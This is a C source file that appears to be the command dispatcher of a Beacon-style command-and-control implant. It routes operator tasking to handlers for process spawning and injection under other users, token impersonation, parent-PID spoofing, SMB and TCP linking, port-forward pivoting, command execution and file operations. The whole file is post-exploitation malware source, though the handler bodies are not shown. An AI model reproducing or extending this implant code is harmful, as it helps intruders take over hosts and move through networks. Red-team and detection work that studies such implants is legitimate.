#include "pch.h"

#include "job.h"
#include "argument.h"
#include "beacon.h"
#include "channel.h"
#include "command.h"
#include "filesystem.h"
#include "identity.h"
#include "link.h"
#include "self.h"
#include "spawn.h"

// Localhost for little endian
#define LOCALHOST 0x0100007f

void TaskDispatch(int cmd, char* buffer, int size)
{
	switch (cmd)
	{
		case COMMAND_LSOCKET_BIND_LOCALHOST:
			ChannelLSocketBind(buffer, size, LOCALHOST);
			break;
		case COMMAND_LSOCKET_BIND:
			ChannelLSocketBind(buffer, size, 0);
			break;
		case COMMAND_SPAWNU_X86:
			SpawnUnder(buffer, size, TRUE);
			break;
		case COMMAND_SPAWNU_X64:
			SpawnUnder(buffer, size, FALSE);
			break;
		case COMMAND_SPAWNAS_X86:
			SpawnAsUser(buffer, size, TRUE);
			break;
		case COMMAND_SPAWNAS_X64:
			SpawnAsUser(buffer, size, FALSE);
			break;
		case COMMAND_SPAWN_PROC_X64:
			SpawnSetTo(buffer, size, FALSE);
			break;
		case COMMAND_SPAWN_PROC_X86:
			SpawnSetTo(buffer, size, TRUE);
			break;
		case COMMAND_FILE_DRIVES:
			FilesystemDrives(buffer, size);
			break;
		case COMMAND_JOB_REGISTER:
			JobRegister(buffer, size, FALSE, FALSE);
			break;
		case COMMAND_JOB_REGISTER_IMPERSONATE:
			JobRegister(buffer, size, TRUE, FALSE);
			break;
		case COMMAND_JOB_REGISTER_MSGMODE:
			JobRegister(buffer, size, FALSE, TRUE);
			break;
		case COMMAND_FILE_MOVE:
			FilesystemMove(buffer, size);
			break;
		case COMMAND_FILE_COPY:
			FilesystemCopy(buffer, size);
			break;
		case COMMAND_SETENV:
			putenv(buffer);
			break;
		
		case COMMAND_JOB_KILL:
			JobKill(buffer, size);
			break;
		case COMMAND_JOBS:
			JobPrintAll();
			break;
		case COMMAND_FILE_LIST:
			FilesystemList(buffer, size);
			break;

		case COMMAND_TOKEN_GETUID:
			IdentityGetUid();
			break;
		case COMMAND_INJECT_PING:
			SpawnAndPing(buffer, size, TRUE);
			break;
		case COMMAND_INJECTX64_PING:
			SpawnAndPing(buffer, size, FALSE);
			break;
		case COMMAND_DIE:
			Die();
			break;
		case COMMAND_SLEEP:
			SleepSet(buffer, size);
			break;
		case COMMAND_CD:
			FilesystemCd(buffer, size);
			break;
		case COMMAND_FILE_MKDIR:
			FilesystemMkdir(buffer, size);
			break;
		case COMMAND_BLOCKDLLS:
			BlockDlls(buffer, size);
			break;
		case COMMAND_TCP_CONNECT:
			LinkViaTcp(buffer, size);
			break;
		case COMMAND_PIPE_OPEN_EXPLICIT:
			ProtocolSmbOpenExplicit(buffer);
			break;
		case COMMAND_LOGINUSER:
			IdentityLoginUser(buffer, size);
			break;
		case COMMAND_PAUSE:
			Pause(buffer, size);
			break;
		case COMMAND_TOKEN_REV2SELF:
			BeaconRevertToken();
			break;
		case COMMAND_EXECUTE:
			Execute(buffer, size);
			break;
		case COMMAND_ARGUE_ADD:
			ArgumentAdd(buffer, size);
			break;
		case COMMAND_ARGUE_REMOVE:
			ArgumentRemove(buffer, size);
			break;
		case COMMAND_ARGUE_LIST:
			ArgumentList();
			break;
		case COMMAND_PWD:
			FilesystemPwd();
			break;
		case COMMAND_RUNAS:
			RunAsUser(buffer, size);
			break;
		case COMMAND_JOB_SPAWN_X86:
			JobSpawn(buffer, size, TRUE, TRUE);
			break;
		case COMMAND_JOB_SPAWN_X64:
			JobSpawn(buffer, size, FALSE, TRUE);
			break;
		case COMMAND_JOB_SPAWN_TOKEN_X86:
			JobSpawn(buffer, size, TRUE, FALSE);
			break;
		case COMMAND_JOB_SPAWN_TOKEN_X64:
			JobSpawn(buffer, size, FALSE, FALSE);
			break;
		case COMMAND_PPID:
			RunSetParentPid(buffer, size);
			break;
		case COMMAND_RUN_UNDER_PID:
			RunUnderPid(buffer, size);
			break;
		case COMMAND_LISTEN:
			ChannelListen(buffer, size);
			break;
		case COMMAND_LSOCKET_TCPPIVOT:
			ChannelLSocketTcpPivot(buffer, size);
			break;
	}
}

void TaskProcess(char* buffer, int length)
{
	datap parser;
	BeaconDataParse(&parser, buffer, length);

	int remaining;
	do
	{
		int cmd = BeaconDataInt(&parser);
		int size = BeaconDataInt(&parser);
		char* data = BeaconDataPtr(&parser, size);

		remaining = BeaconDataLength(&parser);
		if (remaining < 0) // this should never happen
			return;

		TaskDispatch(cmd, data, size);
	} while (remaining > 0);

	BeaconDataZero(&parser);
}

